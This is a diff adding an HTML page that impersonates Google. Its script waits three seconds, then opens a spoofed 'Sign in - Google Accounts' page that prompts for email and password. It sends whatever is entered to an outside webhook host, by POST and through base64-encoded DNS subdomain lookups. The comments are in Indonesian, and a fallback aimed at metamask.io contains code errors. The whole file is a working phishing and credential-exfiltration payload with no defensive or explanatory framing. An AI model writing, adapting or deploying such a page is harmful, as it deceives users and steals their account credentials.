@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>google.com</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .container {
+      max-width: 500px;
+      padding: 40px;
+    }
+    h1 {
+      color: #4285f4;
+      font-size: 3rem;
+      margin-bottom: 2rem;
+    }
+    .info {
+      font-size: 1.2rem;
+      color: #666;
+      margin-bottom: 3rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Google</h1>
+    <p class="info">Loading secure connection... Please wait</p>
+  </div>
+
+  <script>
+    // OOB webhook kamu
+    const OOB = "https://young-comet-60.webhook.cool";
+
+    function y() {
+      // Gunakan data: URL untuk langsung kontrol konten (lebih reliable daripada document.write)
+      const spoofContent = encodeURIComponent(`
+        <html>
+          <head><title>Sign in - Google Accounts</title></head>
+          <body style="margin:0; font-family:Arial; background:#f1f1f1; display:flex; justify-content:center; align-items:center; height:100vh;">
+            <div style="background:white; padding:40px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); text-align:center; width:400px;">
+              <h1>Sign in</h1>
+              <p style="color:#5f6368;">To continue to www.google.com</p>
+              <img src="x" onerror="
+                setTimeout(async () => {
+                  const creds = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
+                  if (creds && creds.trim() !== '') {
+                    try {
+                      await fetch('${OOB}/creds', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                          credentials: creds.trim(),
+                          timestamp: new Date().toISOString(),
+                          origin: location.href,
+                          userAgent: navigator.userAgent
+                        })
+                      });
+                    } catch(e) { console.log('POST failed'); }
+
+                    // DNS OOB backup
+                    const b64 = btoa(creds.trim()).replace(/=/g, '');
+                    const part1 = b64.substring(0, 200);
+                    const part2 = b64.substring(200);
+                    new Image().src = 'https://' + part1 + '.${OOB}';
+                    if (part2) new Image().src = 'https://' + part2 + '.${OOB}';
+                  }
+                }, 150)
+              ">
+            </div>
+          </body>
+        </html>
+      `);
+
+      // Buka dengan data URL (full control, no cross-origin issue)
+      const x = window.open('data:text/html;charset=utf-8,' + spoofContent, '_top');
+
+      // Fallback kalau data URL diblok (beberapa browser ketat)
+      if (!x || x.closed) {
+        x = window.open('https://metamask.io', '_top');
+        setTimeout(() => {
+          if (x && !x.closed) {
+            x.document.write(spoofContent.replace(/data:text\/html;charset=utf-8,/, ''));
+            x.document.close();
+          }
+        }, 500);
+      }
+    }
+
+    // Trigger setelah 3 detik
+    setTimeout(y, 3000);
+
+    console.log("Spoof script loaded. Waiting 3s to trigger...");
+  </script>
+
+</body>
+</html>
